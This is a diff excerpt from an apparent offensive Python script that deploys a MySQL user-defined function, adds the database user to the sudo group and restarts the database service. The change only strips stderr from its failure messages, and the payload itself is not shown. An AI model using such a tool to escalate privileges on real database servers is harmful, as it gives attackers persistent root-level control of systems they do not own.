@@ -50,7 +50,7 @@ def add_sudo_user():
     if result['status'] == 0:
         print("[+] Successfully added database user to sudo group")
     else:
-        print(f"[-] Failed to add database user to sudo group: {result['stderr']}")
+        print("[-] Failed to add database user to sudo group")
 
 def main():
     print("[+] Starting MySQL UDF deployment process")
@@ -63,14 +63,14 @@ def main():
             if result['status'] == 0:
                 print("[+] Successfully restarted database service using systemd")
             else:
-                print(f"[-] Failed to restart database service: {result['stderr']}")
+                print("[-] Failed to restart database service using systemd")
         elif is_using_sysvinit():
             print("[+] Attempting to restart MySQL/MariaDB service using sysvinit...")
             result = sys.shell("sudo service mysql restart || sudo service mariadb restart")
             if result['status'] == 0:
                 print("[+] Successfully restarted database service using sysvinit")
             else:
-                print(f"[-] Failed to restart database service: {result['stderr']}")
+                print("[-] Failed to restart database service using sysvinit")
         else:
             print("[-] Could not determine init system, skipping service restart")
             
